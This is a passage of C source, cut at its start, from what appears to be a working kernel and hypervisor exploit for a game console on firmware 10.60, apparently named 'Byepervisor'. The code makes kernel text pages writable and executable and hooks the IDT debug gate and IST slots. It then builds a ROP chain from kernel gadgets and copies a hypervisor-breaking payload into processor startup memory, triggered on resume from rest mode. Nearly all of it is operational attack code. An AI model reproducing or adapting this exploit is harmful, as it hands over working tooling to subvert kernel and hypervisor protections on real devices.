      memcmp(&locator_readback, &(phase1_framework_locator_t){0},
             sizeof(locator_readback)))
    return -23;
#endif
#ifdef PHASE2_CARRIER
  if (readk(cave + PHASE2_PREALLOC_OFFSET, &phase2_prealloc,
            sizeof(phase2_prealloc)) ||
      memcmp(&phase2_prealloc, &(phase2_prealloc_record_t){0},
             sizeof(phase2_prealloc)) ||
      readk(cave + PHASE2_LOCATOR_OFFSET, &phase2_locator,
            sizeof(phase2_locator)) ||
      memcmp(&phase2_locator, &(phase2_locator_t){0},
             sizeof(phase2_locator)) ||
      kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL) ||
      pin_to_core(0) || get_cpu_core() != 15 ||
      phase2_preallocate(cave, idt, tss, &phase2_prealloc))
    return -25;
  {
    unsigned attempts[PHASE2_ALLOCATION_COUNT] = {0};
    r = phase2_prepare_allocations(pmap, cave, &phase2_prealloc);
    while (r <= -2 && r >= -4) {
      unsigned index = (unsigned)(-r - 2);
      if (attempts[index] == 4)
        break;
      ++attempts[index];
      if (phase2_replace_allocation(cave, idt, tss, &phase2_prealloc,
                                    index, attempts[index]))
        return -25;
      r = phase2_prepare_allocations(pmap, cave, &phase2_prealloc);
    }
  }
  if (r)
    return -25;
#endif
  if (allocate_runtime_exec_page(pmap, cave, &runtime_page))
    return -17;
  if (make_kernel_page_rwx(
          pmap, KERNEL_ADDRESS_TEXT_BASE +
                    RUNTIME_EXEC1060_CFI_THUNK_OFFSET,
          &thunk_pte_address, &thunk_pte) ||
      make_kernel_page_rwx(
          pmap, KERNEL_ADDRESS_TEXT_BASE +
                    RUNTIME_EXEC1060_CFI_TARGET_OFFSET,
          &target_pte_address, &target_pte)) {
    runtime_exec1060_page_t empty = {0};
    close(runtime_exec_pipe);
    runtime_exec_pipe = -1;
    checked_write(cave + RUNTIME_EXEC1060_CAVE_OFFSET, &empty, sizeof(empty));
    return -18;
  }
  r = prepare_reserved_pages(pmap, cave, &runtime_page);
  if (r) {
    if (r == -2) {
      notifyf("10.60 reservation page rollback failed; cold reboot required");
      return -19;
    }
    close(runtime_exec_pipe);
    runtime_exec_pipe = -1;
    return -19;
  }
  // Mirror the original 13.x carrier's prerequisite for CPU affinity.
  if (kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL))
    return -3;
  if (pin_to_core(0) || get_cpu_core() != 15 ||
      readk(idt + 16, gate, sizeof(gate)) ||
      !(gate[0] & (1ULL << 47)))
    return -3;
  if (readq(cave + CAVE_STATE, &state))
    return -4;
  if (state == STATE_ARMED) {
    // On restart, the gate and IST6 slots may still be hooked. Recover the
    // original values from the verified persistent save block.
    if (readq(cave + CAVE_SAVE + 8, &gate[0]) ||
        readq(cave + CAVE_SAVE + 16, &gate[1]) ||
        readk(cave + CAVE_SAVE + 0x18, saved, sizeof(saved)))
      return -4;
    for (;;) {
      r = check_results(cave, tss, saved, gate[0], gate[1]);
      if (r) return r == 1 ? 0 : r;
      sceKernelSleep(1);
    }
  }
  if (state != 0)
    return -5;
  db_ist = (gate[0] >> 32) & 7;
  // The pivot changes only the gate's low qword. Reject a descriptor whose
  // high half would differ before mutating any kernel state.
  if (db_ist < 1 ||
      gate[1] != (kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET) >> 32) ||
      validate_tss(tss, db_ist, saved))
    return -4;
  if (make_ap_executable(cr3, dmap))
    return -6;
  memcpy(source, break_hv, break_hv_len);
  if (checked_write(cave + CAVE_SOURCE, source, 0x400) ||
      checked_write(cave + CAVE_SOURCE + 0x400, source + 0x400, 0x400) ||
      stage_fallbacks(cave))
    return -7;
  for (int i = 0; i < 8; ++i)
    if (checked_q(oracle + (uint64_t)i * 8, 0))
      return -8;
  for (int i = 0; i < 7; ++i)
    if (checked_q(cave + CAVE_STASH + (uint64_t)i * 8, 0))
      return -8;
  if (kh_init(&hook, readk, writek, ktext(0), hook_scratch, 6))
    return -9;
#ifdef PHASE1_CARRIER
  phase1_prealloc_prepare(&prealloc, malloc_type, malloc_flags);
  if (checked_write(prealloc_address, &prealloc, sizeof(prealloc)))
    return -23;
#endif
  hook.tss_stride = 0x68;
  hook.oneshot = 1;
  kh_set_tables(&hook, idt, tss);
  kh_set_core(&hook, 0);
  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  kh_set_resume_rsi(&hook, dmap + AP_PA);
  kh_set_resume_rdx(&hook, cr3);
  kh_chain_init(&chain, chain_buf, sizeof(chain_buf));
#ifdef PHASE1_CARRIER
  for (unsigned i = 0; i < PHASE1_RECORD_COUNT; ++i) {
    kh_chain_call(&chain,
        KERNEL_ADDRESS_TEXT_BASE + g_fw1060_profile.malloc_offset, 3,
        prealloc.sizes[i], malloc_type, malloc_flags);
    kh_chain_store_rax(&chain, prealloc_address +
        offsetof(phase1_prealloc_record_t, addresses) + i * sizeof(uint64_t));
  }
  kh_chain_store(&chain,
      prealloc_address + offsetof(phase1_prealloc_record_t, state),
      PHASE1_PREALLOC_STATE_FIRED);
#endif
  kh_chain_store(&chain, idt + 16, gate[0]);
  kh_chain_store(&chain, oracle + 0x20, CHAIN_MARK);
  kh_chain_memcpy(&chain, dmap + AP_PA, cave + CAVE_SOURCE, 0x800);
  kh_chain_store(&chain, dmap + AP_PA + 0xf00,
                 kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  kh_chain_store(&chain, dmap + AP_PA + 0xf08, dmap);
  kh_chain_store(&chain, dmap + AP_PA + 0xf10, oracle);
  kh_chain_store(&chain, dmap + AP_PA + 0xf18, 0); // regular retail HV offset
  kh_chain_store(&chain, dmap + AP_PA + 0xf20, cave + CAVE_STASH);
  kh_chain_store(&chain, dmap + AP_PA + 0xf28, dmap + AP_PA);
  kh_chain_store(&chain, dmap + AP_PA + 0xf30, cr3);
  kh_chain_store(&chain, dmap + AP_PA + 0xf38, AP_MODE);
  if (chain.err || checked_q(cave + CAVE_SAVE + 8, gate[0]) ||
      checked_q(cave + CAVE_SAVE + 16, gate[1])) {
    r = -10;
    goto prealloc_failure;
  }
  for (int i = 0; i < NCPU; ++i)
    if (checked_q(cave + CAVE_SAVE + 0x18 + (uint64_t)i * 8, saved[i])) {
      r = -10;
      goto prealloc_failure;
    }
  if (checked_q(cave + CAVE_STATE, STATE_ARMED))
    return -10;
  for (int cpu = 1; cpu < NCPU; ++cpu)
    if (checked_q(TSS_SLOT(tss, cpu),
                  cave + CAVE_FALLBACK + (uint64_t)(cpu - 1) * 0x100 + 0x50)) {
      r = -11;
      goto rollback;
    }
  r = kh_install(&hook, &chain);
  if (r) {
    r = -12;
    goto rollback;
  }
  kh_trigger(&hook);
  pivot = kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET);
  expected_gate = (pivot & 0xffff) | (gate[0] & 0xffff0000ULL) |
                  (6ULL << 32) | (0x8eULL << 40) |
                  (((pivot >> 16) & 0xffff) << 48);
  if (readq(idt + 16, &armed_gate) ||
      readq(TSS_SLOT(tss, 0), &armed_ist) ||
      readq(cave + CAVE_STATE, &state)) {
    notifyf("10.60 hook state unreadable; cold reboot required");
    return -14;
  }
  if (armed_gate != expected_gate || armed_ist != hook_scratch + 0x240 ||
      state != STATE_ARMED) {
    // With the original gate restored, #DB no longer uses IST6.
    if (armed_gate != gate[0] || restore_ists(tss, saved) ||
        checked_q(cave + CAVE_STATE, 0)) {
      notifyf("10.60 gate/IST mismatch; cold reboot required");
      return -15;
    }
    return -16;
  }
  snprintf(arm_report, sizeof(arm_report),
           "BYEPERVISOR_1060_ARMED gate=%016lx ist6=%016lx state=%016lx "
           "exec_page=%016lx pte=%016lx thunk_pte=%016lx/%016lx "
           "target_pte=%016lx/%016lx"
#ifdef PHASE1_CARRIER
           " prealloc=%016lx type=%016lx flags=%08x"
#endif
#ifdef PHASE2_CARRIER
           " p2_record=%016lx code=%016lx data=%016lx clone=%016lx "
           "code_leaf=%016lx/%016lx data_leaf=%016lx/%016lx "
           "clone_leaf=%016lx/%016lx"
#endif
           "\n",
           armed_gate, armed_ist, state, runtime_page.address,
           runtime_page.pte_value, thunk_pte_address, thunk_pte,
           target_pte_address, target_pte
#ifdef PHASE1_CARRIER
           , prealloc_address, malloc_type, malloc_flags
#endif
#ifdef PHASE2_CARRIER
           , (uint64_t)(cave + PHASE2_PREALLOC_OFFSET),
           phase2_prealloc.addresses[0], phase2_prealloc.addresses[1],
           phase2_prealloc.addresses[2], phase2_prealloc.code_leaf_address,
           phase2_prealloc.code_leaf_prepared,
           phase2_prealloc.data_leaf_address, phase2_prealloc.data_leaf_value,
           phase2_prealloc.clone_leaf_address[0],
           phase2_prealloc.clone_leaf_value[0]
#endif
           );
  printf("%s", arm_report);
  notifyf("Byepervisor 10.60 hook armed; enter rest mode and resume");
#if !defined(PHASE3_RELEASE) || !defined(PHASE3_CARRIER)
  send_1060_result(arm_report);
#endif
  for (;;) {
    r = check_results(cave, tss, saved, gate[0], gate[1]);
    if (r) return r == 1 ? 0 : r;
    sceKernelSleep(1);
  }
prealloc_failure:
#ifdef PHASE1_CARRIER
  if (checked_write(prealloc_address, &(phase1_prealloc_record_t){0},
                    sizeof(phase1_prealloc_record_t)))
    return -13;
#endif
  return r;

rollback:
  // kh_install may have changed either half of the gate before reporting
  // failure. Restore the original gate *before* clearing fallback ISTs.
  rollback_error = checked_q(idt + 24, gate[1]);
  rollback_error |= checked_q(idt + 16, gate[0]);
  rollback_error |= restore_ists(tss, saved);
  rollback_error |= checked_q(cave + CAVE_STATE, 0);
#ifdef PHASE1_CARRIER
  rollback_error |= checked_write(prealloc_address,
      &(phase1_prealloc_record_t){0}, sizeof(phase1_prealloc_record_t));
#endif
  if (rollback_error) {
    notifyf("10.60 hook rollback failed; cold reboot required");
    return -13;
  }
  return r;
}
